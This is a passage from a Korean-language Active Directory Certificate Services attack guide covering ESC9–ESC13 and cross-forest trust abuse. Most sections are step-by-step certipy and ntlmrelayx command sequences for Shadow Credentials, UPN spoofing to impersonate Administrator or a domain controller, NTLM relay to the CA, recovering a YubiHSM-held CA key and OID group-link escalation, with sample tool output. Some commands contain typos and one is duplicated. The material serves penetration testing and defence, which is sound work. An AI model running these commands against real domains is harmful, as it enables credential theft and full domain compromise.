* `StrongCertificateBindingEnforcement`가 `2`로 조정되지 않은 경우 (기본값은 `1`), 또는 `CertificateMappingMethods`에 `UPN` 플래그가 포함된 경우.
* 인증서가 `msPKI-Enrollment-Flag` 설정 내에서 `CT_FLAG_NO_SECURITY_EXTENSION` 플래그로 표시됨.
* 인증서에 클라이언트 인증 EKU가 지정됨.
* 다른 계정을 침해하기 위해 `GenericWrite` 권한이 제공됨.

### 남용 시나리오

`John@corp.local`이 `Jane@corp.local`에 대한 `GenericWrite` 권한을 보유하고 있으며, `Administrator@corp.local`을 침해하려고 하는 경우를 가정해 봅시다. `Jane@corp.local`이 등록할 수 있는 `ESC9` 인증서 템플릿은 `msPKI-Enrollment-Flag` 설정에서 `CT_FLAG_NO_SECURITY_EXTENSION` 플래그로 구성됩니다.

먼저, `Jane`의 해시는 `John`의 `GenericWrite` 덕분에 Shadow Credentials를 사용하여 획득됩니다:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
이후, `Jane`의 `userPrincipalName`이 의도적으로 `@corp.local` 도메인 부분을 생략하고 `Administrator`로 수정되었습니다:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
이 수정은 `Administrator@corp.local`이 `Administrator`의 `userPrincipalName`으로서 구분되는 한 제약 조건을 위반하지 않습니다.

이에 이어 `Jane`으로 표시된 `ESC9` 인증서 템플릿이 취약하다고 표시됩니다:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
인증서의 `userPrincipalName`이 "Administrator"를 반영하며 "object SID"가 없음을 나타냅니다.

그런 다음 `Jane`의 `userPrincipalName`이 원래 값인 `Jane@corp.local`로 되돌아갑니다:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
인증을 시도하면 이제 `Administrator@corp.local`의 NT 해시가 포함됩니다. 인증 명령에는 인증서에 도메인이 지정되지 않았기 때문에 `-domain <domain>`을 포함해야 합니다:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## 취약한 인증서 매핑 - ESC10

### 설명

도메인 컨트롤러의 레지스트리 키 값 두 개가 ESC10에 의해 언급됩니다:

* `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` 하위의 `CertificateMappingMethods`의 기본 값은 `0x18` (`0x8 | 0x10`)이며, 이전에는 `0x1F`로 설정되었습니다.
* `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` 하위의 `StrongCertificateBindingEnforcement`의 기본 설정은 `1`이며, 이전에는 `0`이었습니다.

**사례 1**

`StrongCertificateBindingEnforcement`가 `0`으로 구성된 경우.

**사례 2**

`CertificateMappingMethods`에 `UPN` 비트 (`0x4`)가 포함된 경우.

### 남용 사례 1

`StrongCertificateBindingEnforcement`가 `0`으로 구성된 경우, `GenericWrite` 권한이 있는 계정 A를 악용하여 어떤 계정 B도 침해할 수 있습니다.

예를 들어, `Jane@corp.local`에 대한 `GenericWrite` 권한을 가지고 있는 경우, 공격자는 `Administrator@corp.local`을 침해하려고 합니다. 이 절차는 ESC9를 반영하여 어떤 인증서 템플릿이든 사용할 수 있습니다.

먼저, `Jane`의 해시를 가져와야 합니다. 이는 Shadow Credentials를 이용하여 `GenericWrite`를 악용하는 것입니다.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
이후, `Jane`의 `userPrincipalName`이 의도적으로 `@corp.local` 부분을 제외한 `Administrator`로 변경됩니다. 이렇게 함으로써 제약 조건 위반을 피합니다.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
다음으로, 기본 '사용자' 템플릿을 사용하여 'Jane'으로 클라이언트 인증을 가능하게 하는 인증서가 요청됩니다.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`의 `userPrincipalName`은 그 후 원래 값인 `Jane@corp.local`로 되돌립니다.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
인증서를 사용하여 인증하면 `Administrator@corp.local`의 NT 해시가 생성되며, 인증서에 도메인 세부 정보가 없기 때문에 명령어에 도메인을 지정해야 합니다.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### 남용 사례 2

`CertificateMappingMethods`에 `UPN` 비트 플래그(`0x4`)가 포함된 경우, `GenericWrite` 권한을 가진 계정 A는 `userPrincipalName` 속성이 없는 계정 B(기계 계정 및 기본 도메인 관리자 `Administrator` 포함)를 손상시킬 수 있습니다.

여기서 목표는 `Jane`의 해시를 획득하여 `DC$@corp.local`을 손상시키는 것입니다. Shadow Credentials를 통해 시작하고 `GenericWrite`를 활용합니다.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane`의 `userPrincipalName`은 `DC$@corp.local`로 설정됩니다.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
인증서를 요청할 때 기본 `User` 템플릿을 사용하여 `Jane`으로 클라이언트 인증서가 요청됩니다.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`의 `userPrincipalName`은 이 프로세스 후에 원래 값으로 되돌립니다.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Schannel를 통해 인증하려면 Certipy의 `-ldap-shell` 옵션을 사용하여 인증 성공을 `u:CORP\DC$`로 표시합니다.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
LDAP 셸을 통해 `set_rbcd`와 같은 명령을 사용하면 Resource-Based Constrained Delegation (RBCD) 공격을 활성화할 수 있으며, 이는 도메인 컨트롤러를 잠재적으로 침해할 수 있습니다.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
이 취약점은 `userPrincipalName`이 없는 사용자 계정 또는 `sAMAccountName`과 일치하지 않는 사용자 계정에도 확장됩니다. 기본 `Administrator@corp.local`은 `userPrincipalName`이 기본적으로 없고 LDAP 권한이 상승되어 있기 때문에 주요 대상입니다.

## ICPR로 NTLM 릴레이 - ESC11

### 설명

CA 서버가 `IF_ENFORCEENCRYPTICERTREQUEST`로 구성되지 않은 경우 RPC 서비스를 통해 서명 없이 NTLM 릴레이 공격을 수행할 수 있습니다. [여기 참조](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

`certipy`를 사용하여 `Enforce Encryption for Requests`가 비활성화되었는지 열거하고 `certipy`가 `ESC11` 취약점을 표시할 수 있습니다.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### 남용 시나리오

릴레이 서버를 설정해야 합니다:
``` bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
참고: 도메인 컨트롤러의 경우, DomainController에 `-template`를 지정해야 합니다.

또는 [sploutchy의 impacket 포크](https://github.com/sploutchy/impacket)을 사용할 수도 있습니다:
``` bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## YubiHSM을 사용한 ADCS CA에 대한 셸 액세스 - ESC12

### 설명

관리자는 인증 기관을 "Yubico YubiHSM2"와 같은 외부 장치에 저장할 수 있습니다.

USB 장치가 CA 서버에 USB 포트를 통해 연결되어 있거나 CA 서버가 가상 머신인 경우 USB 장치 서버에 연결되어 있는 경우, YubiHSM에서 키를 생성하고 사용하기 위해 인증 키(때로는 "비밀번호"로도 불림)가 필요합니다.

이 키/비밀번호는 레지스트리에 `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`에 평문으로 저장됩니다.

참조 [여기](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### 남용 시나리오

CA의 개인 키가 물리적 USB 장치에 저장된 경우 셸 액세스를 얻으면 키를 복구할 수 있습니다.

먼저 CA 인증서(이는 공개적인 정보)를 획들한 후에:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
## OID 그룹 링크 남용 - ESC13

### 설명

`msPKI-Certificate-Policy` 속성을 사용하면 인증서 템플릿에 발급 정책을 추가할 수 있습니다. 발급 정책을 담당하는 `msPKI-Enterprise-Oid` 객체는 PKI OID 컨테이너의 Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services)에서 발견할 수 있습니다. 이 객체의 `msDS-OIDToGroupLink` 속성을 사용하여 정책을 AD 그룹에 연결할 수 있으며, 이를 통해 사용자가 인증서를 제시하는 경우 해당 그룹의 구성원인 것처럼 사용자를 인가할 수 있습니다. [여기에서 참조](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

다시 말해, 사용자가 인증서를 등록할 권한이 있고 해당 인증서가 OID 그룹에 연결된 경우 사용자는 이 그룹의 권한을 상속할 수 있습니다.

OIDToGroupLink를 찾기 위해 [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1)을 사용하세요:
```powershell
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### 남용 시나리오

`certipy find` 또는 `Certify.exe find /showAllPermissions`을 사용할 수 있는 사용자 권한을 찾습니다.

만약 `John`이 `VulnerableTemplate`을 등록할 수 있는 권한을 가지고 있다면, 해당 사용자는 `VulnerableGroup` 그룹의 권한을 상속받을 수 있습니다.

그 사용자는 템플릿을 지정하기만 하면, OIDToGroupLink 권한이 있는 인증서를 받을 수 있습니다.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## 인증서를 통한 포리스트 침해의 수동태로 설명

### Compromised CAs에 의한 포리스트 신뢰 깨기

**크로스 포리스트 등록** 구성은 비교적 간단하게 이루어집니다. 자원 포리스트의 **루트 CA 인증서**는 관리자에 의해 **계정 포리스트로 발행**되며, 자원 포리스트의 **엔터프라이즈 CA** 인증서는 **각 계정 포리스트의 `NTAuthCertificates` 및 AIA 컨테이너에 추가**됩니다. 이러한 배치는 자원 포리스트의 **CA가 관리하는 모든 다른 포리스트에 대해 완전한 제어 권한**을 부여합니다. 만약 이 CA가 **공격자에 의해 침해**된다면, 자원 및 계정 포리스트의 모든 사용자를 대상으로 인증서가 **위조**될 수 있어 포리스트의 보안 경계가 깨질 수 있습니다.

### 외부 주체에게 부여된 등록 권한

다중 포리스트 환경에서는 **인증된 사용자 또는 외부 주체** (엔터프라이즈 CA가 속한 포리스트 외부의 사용자/그룹)에게 **등록 및 편집 권한을 허용하는 인증서 템플릿을 발행하는 엔터프라이즈 CA**에 대해 주의가 필요합니다.\
신뢰를 통해 인증되면 AD에 의해 사용자의 토큰에 **인증된 사용자 SID**가 추가됩니다. 따라서, 도메인이 **인증된 사용자 등록 권한을 허용하는 템플릿을 보유**하고 있다면, 다른 포리스트의 사용자가 해당 템플릿을 **등록**할 수 있습니다. 마찬가지로, **템플릿에 의해 외부 주체에게 명시적으로 등록 권한이 부여**된 경우, **포리스트 간 액세스 제어 관계가 생성**되어 한 포리스트의 주체가 다른 포리스트의 **템플릿을 등록**할 수 있게 됩니다.

두 시나리오 모두 한 포리스트에서 다른 포리스트로의 **공격 표면을 증가**시킵니다. 인증서 템플릿의 설정은 공격자가 외부 도메인에서 추가 권한을 얻을 수 있도록 악용될 수 있습니다.
